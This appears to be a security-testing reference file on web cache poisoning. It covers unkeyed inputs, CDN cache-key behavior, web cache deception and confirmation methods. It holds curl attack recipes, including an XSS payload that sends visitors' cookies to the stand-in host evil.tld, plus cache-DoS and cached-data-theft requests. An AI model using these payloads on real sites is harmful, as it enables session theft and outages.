---
name: web-cache-poisoning
description: "Web cache poisoning testing — unkeyed-input exploitation (reflected headers, cache parameter cloaking, fat-GET body, URL-decode normalization, fragment unkeying), CDN cache-key behavior across stacks, cache-poisoned XSS elevation, and the three-step confirmation protocol."
---

# Web Cache Poisoning

Web cache poisoning is a trust-boundary failure between an intermediary HTTP cache and the origin server: an attacker-controlled request component influences the response (headers, body, status) but is excluded from the cache-key calculation; the cache treats the request as equivalent to normal requests at the same key; the poisoned response is served to every subsequent requester whose request computes to the same key. The attacker's single poisoning request yields repeated downstream impact — stored XSS, cross-user redirection, cache-DoS, cross-user data leak — until the cache entry evicts.

The class is anchored on James Kettle's "unkeyed input" terminology (`portswigger.net/research/practical-web-cache-poisoning`, 2018 primary paper, updated 2020 "Web Cache Entanglement"). The core primitive: a request component that modifies the response but is omitted from the cache key. The three-step confirmation protocol is the gate separating this class from one-off reflections: (1) send poison with cache-buster, (2) send a request without the malicious header to the same URL from a different network / unproxied browser, (3) observe the poisoned response is still served + cache-hit evidence in `Age`, `Via`, `X-Cache`, or `CF-Cache-Status`.

Load `web_cache_poisoning_advanced_deep` for cache-key composition reconnaissance, per-CDN cache-key behavior (Cloudflare, Fastly, Akamai, CloudFront, Varnish), chain-with-XSS depth, cache-key confusion, and advanced-tier exploitation. Load `web_cache_poisoning_novel_deep` for the 2024–2026 verified CVE catalog (ATS fragment-unkeying CVE-2021-27577 as canonical mechanism exemplar; Next.js cache poisoning CVE-2024-46982) and the per-CDN × per-header behavioral matrix with unverified-current entries flagged. Overlapping surfaces route by filename: `header_injection` for Host-header / X-Forwarded-* header-trust primitives (the base class owned); `xss` for the XSS payload the cache-poisoned response delivers; `http_request_smuggling` for cache-poisoning-via-smuggling at the frontend/backend boundary; `semantic_confusion` for parser-differential primitives at the HTTP layer.

## Standards and Terminology

- **PortSwigger "Practical Web Cache Poisoning"** (Kettle, 2018; "Web Cache Entanglement," Black Hat USA 2020) — origin of the "unkeyed input" terminology. The canonical mechanism statement: an attacker-controlled request component modifies the response but is excluded from the cache-key calculation; subsequent cache-hits serve the poisoned response.
- **CERT/CC VU#335217** (January 2020) — "Content Delivery Networks handle HTTP headers in different and unexpected ways." Enumerates 13 inconsistently-handled headers (Content-Security-Policy-Report-Only, Forwarded, Server-Timing, Set-Cookie, Strict-Transport-Security, X-Forwarded-Proto, Location, Accept-Language, Cookie, X-Forwarded-For, X-Forwarded-Host, Referer, Max-Forwards) across Akamai Technologies, Amazon CloudFront, and Cloudflare. **Historical baseline (Jan 2020), not current status**; CDN behavior has evolved and specific-edge status requires fresh verification.
- **"Your Cache Has Fallen"** (Nguyen et al.) — academic coverage of the Cache-Poisoned DoS (CP-DoS) class, including the HTTP Meta Character (HMC) variant.
- **CCS'24 "Detecting and Measuring Web Cache Poisoning in the Wild"** (Chen et al.) — re-validation of Kettle's primitives at scale against production targets.
- **RFC 7234** HTTP/1.1 Caching (and its successor RFC 9111) — normative definition of cache behavior; `Vary` header for cache-key extension.

## Attack Surface

**Cacheable responses with user-visible impact**
- Reflected input in HTML, JS, CSS, redirect targets, meta tags
- Responses with cross-session user-identifiable content

**Caching intermediaries**
- CDN edges (Cloudflare, Fastly, Akamai, CloudFront)
- Load balancers (ALB, Varnish, HAProxy)
- Application-level caches (Nginx proxy_cache, Apache mod_cache, Rails Rack::Cache)
- Framework-level caches (Next.js ISR, Nuxt generate, Astro output: 'static', Django cache middleware)

**Unkeyed-input vectors**
- Request headers: Host (sometimes keyed, often not downstream), X-Forwarded-Host, X-Forwarded-Scheme, X-HTTP-Method-Override, X-Host, X-Original-URL, X-Rewrite-URL, Fastly-Host
- URL components: query parameters (varies — cache may key only subset), fragment (never sent on wire, but server-side proxy behavior), path case, URL normalization
- Body on GET requests (fat GET): Varnish without builtin.vcl + Cloudflare forward body without keying
- Cookie values (sometimes keyed, often not)
- Content-Type on preflight / non-standard methods

**Cacheable error responses**
- 400 Bad Request, 404 Not Found, 500 responses cached by intermediaries when no explicit Cache-Control forbids it

## High-Value Targets

- Pages reflecting Host-header into HTML (`<meta property="og:url" content="//<host>/">`, canonical links, OAuth redirect URIs)
- Pages reflecting X-Forwarded-Host or X-Forwarded-Scheme into redirect targets or absolute URLs
- Pages constructed server-side with request-header interpolation into script-src URLs
- Reset-password flows that email the Host-header value as the reset URL
- Error pages (400/500) that include request details (parameters, headers echoed)
- CDN-cached JS/CSS assets whose contents depend on request headers

## Reconnaissance

### Unkeyed-Input Discovery

Baseline: identify which request components the cache keys on vs forwards without keying.

```bash
# Prepare a cache-buster to force a fresh request each probe
BUSTER=$(date +%s)

# Probe: inject a candidate header; observe reflection + cache behavior
curl -sI "https://target.tld/?cb=$BUSTER" \
     -H 'X-Forwarded-Host: evil.tld' | grep -iE 'x-cache|age|via|cf-cache-status'
curl -sI "https://target.tld/?cb=$BUSTER&probe=1" \
     -H 'X-Forwarded-Host: evil.tld' | grep -iE 'x-cache|age'

# If probe=1 response reflects X-Forwarded-Host in body/headers AND cache-buster varies cache-key, verify poisoning:
# 1. Send poison with cache-buster X
# 2. Send clean request with cache-buster X (no X-Forwarded-Host header)
# 3. If response still contains attacker payload AND X-Cache: HIT, the request component is unkeyed
```

### Cache-Key Composition Mapping

Observable signals of what IS keyed:
- Different URLs produce different cache behavior → path/query keyed
- Different Hosts produce different cache behavior → Host keyed (likely at the edge)
- Different cookies produce different cache behavior → cookie partially keyed

Observable signals of what IS NOT keyed:
- Different values of a header produce the same cached response → header is unkeyed
- Response from different clients (different cookies, auth) is identical → cache serves cross-session

### Cache-Hit Evidence Headers

The confirmation signal that a response came from cache:
- `Age: <seconds>` — RFC 7234 header; non-zero means served from cache
- `X-Cache: HIT` / `MISS` — common on multiple CDNs (not standard but widely used)
- `CF-Cache-Status: HIT` / `MISS` / `BYPASS` — Cloudflare
- `X-Served-By: cache-<id>` — Fastly
- `X-Cache: HIT from cloudfront` — AWS CloudFront
- `Via: 1.1 varnish-v4` — Varnish often sets Via on cached response
- `X-Varnish: <xid> <xid>` — Varnish; two IDs means the second is a cached response

Absence of all cache-hit signals + two identical responses to attacker-controlled varying inputs = probable cache hit even without the explicit signal.

## Key Vulnerabilities

### Unkeyed Request-Header Reflection

Primitive: attacker-controlled request header modifies the response (reflected in body, used as redirect target, or incorporated into subsequent server-side logic) but is excluded from the cache key.

**Common unkeyed headers** (per PortSwigger + CERT/CC baseline, baseline-status 2020):
- `X-Forwarded-Host` — frequently reflected as the user-facing Host; often unkeyed
- `X-Forwarded-Scheme` / `X-Forwarded-Proto` — reflected as the user-facing scheme in redirects
- `X-Host` — alternative Host-override header
- `X-HTTP-Method-Override` — method override; some caches key, many do not
- `Fastly-Host` — Fastly-specific host-override; **note this is Fastly-specific, not a universal header**
- `Accept-Language` — sometimes reflected, often keyed via `Vary: Accept-Language`
- `User-Agent` — reflected in some responses, keyed via `Vary: User-Agent`

**Attack recipe**:
```bash
# Poison the cache with attacker Host
curl -sI "https://target.tld/account?cb=X" \
     -H "X-Forwarded-Host: evil.tld"

# Verify poisoning in a fresh browser session
# User who visits https://target.tld/account?cb=X sees content whose links point to evil.tld
```

**Impact depends on reflection target**:
- Reflected into `<meta property="og:url" content="//<host>/">` → poisoned social-media sharing links
- Reflected into password-reset email URLs (Host-header exploitation) → account takeover primitive routed to `header_injection`
- Reflected into script-src URLs → cache-poisoned script injection (XSS via CDN caching)

### Cache Parameter Cloaking (Framework Delimiter Quirks)

Primitive: a URL-parsing framework treats a non-standard delimiter as parameter separator; the cache keys on the standard parsing (which sees fewer parameters); the framework sees additional attacker parameters.

**Historical primitive (Kettle 2020, Rails Rack 2.x)**: Ruby on Rails via Rack 2.x treated `;` as a parameter separator equivalent to `&`. A URL like `?a=1&b=2;c=3` keyed as two parameters by the cache (which sees `b=2;c=3` as one value) but parsed as three by Rack. Attacker-supplied `b=2;c=sensitive-override` smuggled an unkeyed `c` parameter that the application honored.

**Measured update (Batch 13, 2026-10-04)**: current Rack 3.2.7 (Ruby 3.3.8) does **NOT** treat `;` as a separator in `Rack::Utils.parse_nested_query` — the test input `"a=1;b=2"` returned `{"a"=>"1;b=2"}`. **The Kettle 2020 primitive is not reproducible against current Rack 3.x.** The primitive remains live for applications using older Rack 2.x (common in long-running Rails deployments) and for Ruby's `CGI.parse`, which still treats `;` as separator (`CGI.parse("a=1;b=2")` → `{"a"=>["1"], "b"=>["2"]}`).

**Current measurement note**: before claiming Rails `;`-as-`&` cache parameter cloaking against a target, verify the deployed Rack version. If Rack 3.x, the primitive is likely absent at this layer; test instead for `CGI.parse` or application-level manual parsing.

**Attack recipe (where applicable)**:
```
GET /?user_id=12345&role=guest;role=admin HTTP/1.1
# Cache keys: ?user_id=12345&role=guest;role=admin (one role=guest;role=admin value)
# Rack 2.x: user_id=12345, role=admin (last-write-wins on duplicate; the smuggled role=admin wins)
```

### Fat GET Request Body

Primitive: a GET request with an attacker-controlled body influences server processing; the cache keys on the URL alone, ignoring the body.

**Baseline-confirmed stacks** (per PortSwigger):
- Varnish without the `builtin.vcl` snippet: forwards GET body without including it in the cache key
- Cloudflare (all systems): forwards fat GET bodies without body-keying — Cloudflare's current docs explicitly state "Do not trust GET request bodies"
- GitHub was vulnerable pre-patch ($10k bounty, mentioned in Kettle 2020)

**Attack recipe**:
```bash
# Poison: GET with attacker body (semantics interpreted by backend as POST-equivalent on misconfigured endpoints)
curl -X GET "https://target.tld/api/user?id=victim" \
     -H "Content-Length: 50" \
     --data '{"admin_role":"true"}'

# Verify: subsequent GET without body returns the poisoned response
curl "https://target.tld/api/user?id=victim"
```

**Impact**: cross-user state in the cached response; whatever the body-processing path produced is cached.

### URL-Decode Cache-Key Normalization

Primitive: the cache (or origin server) applies URL-decoding to the request path before cache-key composition; attacker-controlled percent-encoding produces a different normalized key than the backend's routing uses.

**Measured (Batch 13)**: Nginx 1.27 applies URL-decoding during request parsing. The probe:
- `/__echo?product=X` → request parsed as path `/__echo`, query `product=X`; URI `/__echo`, decoded `/__echo`
- `/__echo%3fproduct=X` → `%3f` decoded to `?`; path becomes `/__echo?product=X` which does NOT match `location = /__echo` (returned 404)
- `/__echo/..%2F..%2Fetc` → `%2F` is `/`; Nginx rejects the encoded `..` traversal with 400 Bad Request (modern Nginx hardening)

**Primary-source primitive (Kettle 2020)**: Mozilla Firefox update redirect on `download.mozilla.org` was poisoned via `GET /%3fproduct=firefox-73.0.1-complete&os=osx&lang=en-GB&force=1`. The cache keyed on the decoded form, which collided with legitimate requests; the attacker's response was served to subsequent clients.

**Attack recipe**:
```bash
# Poison with URL-encoded delimiters that normalize differently
curl -sI "https://target.tld/%3fparam=attacker-value"
```

**Confirmation**: subsequent legitimate request to `https://target.tld/?param=anything` returns the attacker-poisoned response.

### Fragment-Unkeyed Cache-Key (ATS)

Primitive: Apache Traffic Server (ATS) excludes the URL fragment from the cache key but forwards the full URL (including fragment) to the backend. Attacker-controlled fragment is unkeyed-input.

**Canonical CVE instance** (version metadata single-owned by novel sibling): **CVE-2021-27577** — ATS versions 7.0.0-7.1.12, 8.0.0-8.1.1, 9.0.0-9.0.1 affected. Historical for the current ATS line but canonical as a mechanism exemplar.

**Attack recipe**:
```bash
# Fragment is normally not sent on-wire, but ATS forwards it to backend
# Poison via a Burp-crafted request
GET /#admin-override HTTP/1.1
Host: target.tld
# ATS cache key: /
# ATS forward to backend: /#admin-override
# Backend processes "admin-override" as a request parameter it should not have
```

### Cacheable 400s (CP-DoS / HMC)

Primitive: a request containing an RFC 7230-illegal character causes a cacheable 400 Bad Request; the cache's edge forwards the invalid request without rejecting it and caches the 400 absent explicit `Cache-Control` directives. Subsequent clients receive the 400 — denial of service via cache poisoning.

**The HTTP Meta Character (HMC) variant**: send a header containing an RFC 7230-illegal character (backslash is only permitted inside quoted-string per the field-content grammar). Edges that forward invalid headers and cache 400s produce the DoS.

**Baseline-confirmed edges**:
- Akamai: documented cache of 400 responses from backslash-containing headers
- AWS CloudFront: confirmed in older research, remediated per primary source

**Note on scope**: the primary-source youst.in post names Akamai specifically; the "multiple CDN edges" generalization has been questioned (vote 2-1 in Batch 13 cross-check). State the specific edge where the demonstration validated.

**Attack recipe**:
```bash
# Send a header with RFC 7230-illegal backslash
curl -sI "https://target.tld/" \
     -H "X-Custom-Header: value\with\backslash"
# If the edge caches 400, subsequent clients get 400
```

### Web Cache Deception

Primitive: trick an intermediary cache into storing an authenticated response at a URL that the cache treats as public-cacheable. The attacker reads the victim's authenticated response by requesting the same URL from an unauthenticated session.

**Preconditions**:
- Cache decides cacheability by URL extension (`.css`, `.js`, `.png`, `.pdf` → cached regardless of auth)
- Framework routes unknown-extension URL to a dynamic handler (ignores the extension)
- Framework returns authenticated content for the fake-extension URL

**Attack recipe**:
```http
# Victim is tricked (phishing link, open-redirect, embedded fetch) into visiting:
GET /account/settings.css HTTP/1.1
Cookie: session=<victim-cookie>

# Cache: ".css file" → stores response regardless of Cache-Control
# Backend: /account/settings.css → routes to settings handler → returns victim data

# Attacker from a clean session:
GET /account/settings.css HTTP/1.1

# Cache: HIT → returns victim's settings as "stylesheet"
```

**Delimiter-shift variants** (frameworks that strip semicolons, path parameters):
- `/account/settings;.css`, `/account/settings/.css`, `/account/settings%2F.css`, `/account/settings%00.css`

Primary source: Omer Gil, "Web Cache Deception Attack" (2017; Black Hat USA 2017). Full depth and extension matrix at `web_cache_poisoning_advanced_deep.md § Web Cache Deception`; the 2024 OpenAI ChatGPT public bug-bounty instance is a current example.

**Confirmation**: an unauthenticated requester receives authenticated content; cross-user crossing is the finding.

### CDN-Cached Reflected-XSS Elevation

Primitive: the cache transforms a reflected-XSS primitive into a stored-XSS primitive by caching the attacker's HTML/JS payload and serving it to subsequent requesters.

**Primary-source instances** (PortSwigger baseline):
- Red Hat (Open Graph meta tag injection): `<meta property=og:image content=https://a.><script>alert(1)</script>/>` cached by Akamai, served to subsequent visitors
- Unity3D: header-driven cached `<script src=...>` imports — attacker Host-header set the import URL; cached response served to all users

**CERT/CC VU#335217 Akamai statement verbatim**: "traditional reflected XSS, elevated to stored XSS due to CDN caching."

**Attack recipe**:
```bash
# Target: a page echoing X-Forwarded-Host into <meta property="og:url">
curl "https://target.tld/some-cached-page" \
     -H 'X-Forwarded-Host: evil.tld"><script>fetch("https://evil.tld/log?c="+document.cookie)</script><!--'
# Response: 
#   <meta property="og:url" content="//evil.tld"><script>fetch(...)</script><!--/">
# Cached; every subsequent visitor executes the script
```

**Elevation significance**: a reflected XSS at this endpoint without cache poisoning requires per-victim delivery (phishing link, social-engineered URL). With cache poisoning, the attack is one-shot and reaches every visitor until cache eviction.

## CDN Behavioral Matrix (Unverified-Current)

The CERT/CC VU#335217 (Jan 2020) baseline enumerates 13 inconsistently-handled headers across Akamai, CloudFront, and Cloudflare. The per-CDN current status requires fresh verification; **do not assert 2026 status from 2020 VU#335217 or youst.in baselines**. The full matrix is in `web_cache_poisoning_advanced_deep.md § CDN Behavioral Matrix` with primary-source citations and per-edge verification notes; the novel sibling owns version metadata for the matrix.

Specific documented behaviors (as of their respective disclosure):
- **Cloudflare**: lowercased Host forwarded as-sent in historical reports; current behavior requires fresh test
- **Fastly**: Fastly-Host header is Fastly-specific; not a universal unkeyed-header primitive
- **Akamai**: forwards invalid headers and caches 400s (CP-DoS surface documented); current status requires verification
- **AWS CloudFront**: historically confirmed CP-DoS, remediated per primary source
- **Varnish**: without builtin.vcl, forwards fat GET bodies without body-keying; capitalized-host edge case documented (Dec 2020)

Load `web_cache_poisoning_advanced_deep` for the full matrix depth with the per-CDN × per-header grid.

## Measured — Parser/Cache-Key Behaviors

Per the Batch 13 measurement artifact (`.zen-batch-artifacts/batch-13/cache-poison/`):

**Rack 3.2.7 `parse_nested_query`** (Ruby 3.3.8):
- `parse_nested_query("a=1&b=2")` → `{"a"=>"1", "b"=>"2"}`
- `parse_nested_query("a=1;b=2")` → `{"a"=>"1;b=2"}` ← `;` NOT treated as separator
- `parse_nested_query("a=1&b=2;c=3")` → `{"a"=>"1", "b"=>"2;c=3"}` ← `;` NOT separator
- `CGI.parse("a=1;b=2")` → `{"a"=>["1"], "b"=>["2"]}` ← stdlib CGI still treats `;` as separator

**Python 3.14.6 `parse_qs`**:
- `parse_qs("a=1;b=2")` → `{'a': ['1;b=2']}` ← `;` NOT separator (default)
- `parse_qs("a=1;b=2", separator=";")` → `{'a': ['1'], 'b': ['2']}` ← opt-in

**Nginx 1.27 (default config)**:
- URL-encoded `%3f` in path is decoded during request parsing; the decoded path affects location-block matching
- URL-encoded `..` traversal (`..%2F`) is rejected with 400 Bad Request (modern Nginx hardening)

**Primitive-class update** (measured correction): the Kettle 2020 Rails `;`-as-`&` cache parameter cloaking primitive is **not reproducible against current Rack 3.x** at the `parse_nested_query` layer. The primitive remains live for `CGI.parse` and applications on older Rack 2.x; before claiming the finding, verify the deployed Rack version.

## Framework-Specific

### Next.js (CVE-2024-46982)

Next.js cache-poisoning CVE-2024-46982 — a specific Next.js cache-key composition issue permitting cross-user cache contamination. Version metadata and mechanism at `web_cache_poisoning_novel_deep.md § Next.js ISR Cache Poisoning`.

### Rails / Rack

Legacy applications on Rack 2.x may exhibit `;`-as-`&` cache parameter cloaking (per the measured update above). Rack 3.x narrows the surface; `CGI.parse` and application-level manual parsing remain exposed.

### Nginx

URL-decode normalization at request-parse time can shift location-block matching; measured in Batch 13 artifacts. Application-level caching (`proxy_cache`) uses the decoded form as the default cache-key; the `proxy_cache_key` directive customizes but defaults to `$scheme$proxy_host$request_uri` which uses the decoded request URI.

### Varnish

Without `builtin.vcl`, fat GET bodies are forwarded without body-keying — Kettle 2020 baseline. The capitalized-host edge case (Dec 2020) is a related surface; current status in current Varnish release should be verified.

### CDN-Edge Config (Cloudflare, Fastly, Akamai, CloudFront)

Each edge's cache-key composition is configurable per deployment. The default is typically `(host, path, query)` — but every header the edge forwards without keying is a potential unkeyed input. Load the advanced sibling for the per-CDN depth.

## Exploitation Scenarios

### Cross-User XSS via Cached X-Forwarded-Host

1. Target page's HTML includes `<meta property="og:url" content="//<X-Forwarded-Host>">` with the header reflected server-side
2. The CDN caches responses without `Vary: X-Forwarded-Host`, so the X-Forwarded-Host is unkeyed
3. Attacker sends `X-Forwarded-Host: evil.tld"><script>...</script><!--`
4. Response cached with the XSS payload
5. Every subsequent visitor executes the script

### Password-Reset Email Hijack via Host-Header Cache Poisoning

1. Target application generates password-reset emails using the request Host header for the reset URL
2. Attacker triggers a reset for the victim via POST with `Host: evil.tld` or `X-Forwarded-Host: evil.tld`
3. Cache poisoning requires the Host-override header to be unkeyed AND the response to be cacheable
4. If the reset endpoint is non-cacheable (POST, no-cache header), this is a header-injection finding, NOT a cache-poisoning finding — route to `header_injection`
5. For CACHE-POISONED Host-header: a GET-reset-link endpoint whose response caches with Host-reflection — rare but documented

### Cache-DoS via Cacheable 400

1. Target CDN caches 400 responses when origin returns them without explicit `Cache-Control`
2. Attacker sends request with RFC 7230-illegal header; backend returns 400
3. 400 is cached under the normal URL's key
4. Subsequent legitimate users receive 400 until cache eviction

## Confirmation and Validation Discipline

The three-step confirmation protocol (per Kettle 2020):

1. **Poison** — send the suspected unkeyed-input request with a cache-buster to force fresh cache-fill
2. **Clean request** — send the same URL (same cache-buster) WITHOUT the malicious header, from a different network / unproxied browser (to defeat local DNS / router caching)
3. **Observe** — if the response still contains the attacker payload AND `Age`, `Via`, `X-Cache: HIT`, or `CF-Cache-Status: HIT` indicates cache serve, cache poisoning is confirmed

Beyond the three-step protocol:
- Reproduce from an incognito browser or `curl` without the attacker's cookies — demonstrates cross-session impact
- Record the cache-eviction behavior: how long the poison persists (useful for impact scoping)
- For response-body reflections, capture the actual rendered content (`curl -o`) showing attacker bytes

## Chaining and Routing

Upstream (what delivers an unkeyed-input primitive):

- `header_injection` — Host and X-Forwarded-* headers are the canonical unkeyed-input vectors; the base class is header-injection, the cached consequence is this file
- `http_request_smuggling` — frontend/backend desync enables writing a poisoned response to the cache from a smuggled request (cache poisoning via smuggling)
- `semantic_confusion` — HTTP parser differentials between the cache and the origin create new unkeyed-input vectors

Downstream (what cache poisoning enables):

- Cross-user XSS → `xss` (the payload the cache delivers)
- Cross-user redirection → `open_redirect` (the URL the cache delivers)
- Cache-DoS → application unavailability for cached routes
- Cross-user data leak → cached response contains another user's data

Composite chains:
- Unkeyed X-Forwarded-Host → cached XSS → mass-victim account access
- HTTP smuggling → poisoned cache entry → arbitrary subsequent response at the cached path
- Nginx URL-decode normalization → cache-key collision → DoS or routing confusion

## Testing Methodology

1. **Enumerate cacheable endpoints**: inspect `Cache-Control`, `Age`, `X-Cache`, `CF-Cache-Status`
2. **Identify reflections**: find request components reflected in cacheable responses
3. **Probe unkeyed-input vectors**: for each candidate header, send poison + clean + observe
4. **Classify the primitive**: unkeyed-header reflection, cache parameter cloaking, fat-GET body, URL-decode normalization, fragment unkeying, cacheable 400
5. **Verify three-step protocol**: poison, clean, observe (different network/browser)
6. **Fingerprint the cache**: edge CDN identification (`CF-Cache-Status`, `X-Served-By`, `X-Varnish`, `X-Cache: ... from cloudfront`)
7. **Scope impact**: measure cache TTL, eviction behavior, geographic distribution

## Validation

1. State the invariant the poisoning violates ("responses at `/account/view` should return the requesting user's content, not attacker-chosen content")
2. Reproduce the three-step confirmation protocol: poison → clean → observe with cache-hit evidence
3. Capture the poisoned response bytes AS SERVED to the clean requester (not the poisoner's view)
4. Document the cache-eviction timeline — how long the poison persists
5. Confirm cross-session impact: the second requester must be a different user/session, not the poisoner

## False Positives

- The response reflects the header but is NOT cached (verify `Cache-Control: no-store`, `private`, dynamic timestamps that invalidate on each request)
- The response is cached but the header IS keyed (verify by sending two requests with different header values and seeing different cached responses)
- The response reflects but the three-step protocol fails: the clean request without the header does not return the attacker payload — the primitive is one-shot reflection, not cache poisoning
- The cache-eviction is immediate (TTL = 0 or near-zero) — the cache poisoning window is too short to produce real impact

## Impact

- Cross-user stored XSS at scale (every visitor executes the script)
- Mass account takeover via cached authentication flow redirects
- Cache-DoS: application unavailable at the cached path until eviction
- Cross-user information leak: cached response contains the next user's data
- Supply-chain compromise: cached script `src` points to attacker-controlled URL

## Pro Tips

1. The three-step confirmation protocol is the gate — a "cache poisoning finding" without it is reflection; verify from a different network/browser
2. `Age`, `X-Cache: HIT`, `CF-Cache-Status: HIT` are the ground-truth signals; headers alone are not sufficient
3. The Kettle 2020 Rails `;`-as-`&` primitive has narrowed on current Rack 3.x per measurement — verify Rack version before claiming
4. Nginx's URL-decoding at request-parse time can shift cache-key composition; test percent-encoded delimiters
5. Fat GET bodies work on Varnish-without-builtin.vcl + Cloudflare (per primary source); verify your target's stack
6. ATS CVE-2021-27577 is a canonical mechanism exemplar but historical for current ATS; load novel sibling for version metadata
7. CDN behavioral baselines from CERT/CC VU#335217 (Jan 2020) and youst.in are historical, not current status — flag as unverified-current and test the live edge
8. CP-DoS and the HMC variant are documented primarily against Akamai; the "multiple CDN edges" generalization is a vote 2-1 concern — name the specific edge
9. The attack surface at the cache layer is distinct from the header-injection class at the application layer — route by filename when the cross-cutting primitive is the Host header
10. The novel-tier frontier is middleware/framework-specific (Next.js ISR, CVE-2024-46982) and CVE-anchored; load the novel sibling for version metadata

## Summary

Web cache poisoning is the trust-boundary failure between the HTTP cache and the origin server: an attacker-controlled unkeyed input modifies the response the cache serves to every subsequent requester. The three-step confirmation protocol (poison, clean, observe-with-cache-hit) is the gate separating this class from one-shot reflections. The primary technique classes are unkeyed-header reflection, cache parameter cloaking (framework delimiter quirks), fat-GET body, URL-decode normalization, fragment unkeying (ATS), and cacheable 400s (CP-DoS). The 2024–2026 frontier is CVE-anchored (Next.js ISR, ATS as historical exemplar) with per-CDN × per-header matrices that need fresh verification against unverified-current baselines. Load `web_cache_poisoning_advanced_deep` for per-CDN behavioral depth and chained exploitation; load `web_cache_poisoning_novel_deep` for CVE catalog with version metadata and per-CDN matrix depth.
